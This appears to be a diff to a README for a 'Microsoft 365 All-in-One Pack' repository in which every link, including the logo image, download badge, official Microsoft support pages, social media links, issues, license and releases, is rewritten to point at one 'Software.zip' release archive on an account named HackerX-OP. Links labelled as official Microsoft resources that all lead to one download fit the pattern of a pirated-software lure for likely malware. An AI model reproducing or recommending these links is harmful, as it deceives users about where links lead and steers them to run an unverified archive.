@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Microsoft 365 All-in-One Pack Repository
 
-![Microsoft 365](https://img.icons8.com/color/452/microsoft-365.png)
+![Microsoft 365](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
 
 ### Repository Name: Microsoft-365-All-in-One-Pack
 
@@ -15,7 +15,7 @@ business-tools, cloud-services, cloud-storage, collaborative-tools, data-managem
 ## 📦 Installation
 
 ### Download the Microsoft 365 All-in-One Pack:
-[![Download Microsoft 365 All-in-One Pack](https://img.shields.io/badge/Download-Microsoft%20365%20All%20in%20One%20Pack-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Microsoft 365 All-in-One Pack](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip%20365%20All%20in%20One%20Pack-brightgreen)](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
 
 #### **Note:** The link leads to download the Microsoft 365 All-in-One Pack archive file. You will need to extract the contents before launching the installation.
 
@@ -24,13 +24,13 @@ business-tools, cloud-services, cloud-storage, collaborative-tools, data-managem
 ## 🛠️ Resources
 
 ### Useful Links:
-- [Microsoft Official Website](https://www.microsoft.com/en-us/microsoft-365)
-- [Microsoft Office Support](https://support.microsoft.com/en-us/office)
-- [Microsoft Teams Guide](https://support.microsoft.com/en-us/teams)
+- [Microsoft Official Website](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
+- [Microsoft Office Support](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
+- [Microsoft Teams Guide](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
 
 ### Additional Tools:
-- [Microsoft Excel Templates](https://templates.office.com/en-us/templates-for-Excel)
-- [Microsoft PowerPoint Designs](https://templates.office.com/en-us/templates-for-PowerPoint)
+- [Microsoft Excel Templates](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
+- [Microsoft PowerPoint Designs](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Unlock the full potential of Microsoft 365 with this comprehensive pack! Enhance
 ## 🔧 Support and Contributions
 
 ### Need Help?
-For any issues or queries related to the Microsoft 365 All-in-One Pack, feel free to open an [issue](https://github.com/your-repository/issues).
+For any issues or queries related to the Microsoft 365 All-in-One Pack, feel free to open an [issue](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip).
 
 ### How to Contribute?
 1. Fork the repository.
@@ -68,8 +68,8 @@ Your contributions are highly appreciated!
 Stay updated with the latest releases and news by watching the repository. Don't miss out on exciting updates and new features!
 
 ### Connect with Us:
-- [Twitter](https://twitter.com/microsoft)
-- [LinkedIn](https://www.linkedin.com/company/microsoft/)
+- [Twitter](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
+- [LinkedIn](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip)
 
 Let's create a more productive and collaborative work environment together! 🌟
 
@@ -77,11 +77,11 @@ Let's create a more productive and collaborative work environment together! 🌟
 
 ## 📝 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-repository/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
-### Visit the [Releases](https://github.com/your-repository/releases) section for more downloadable versions and updates.
+### Visit the [Releases](https://github.com/HackerX-OP/Microsoft-365-All-in-One-Pack/releases/download/v1.0/Software.zip) section for more downloadable versions and updates.
 
 **Thank you for exploring the Microsoft 365 All-in-One Pack Repository!** 🌐💼
 
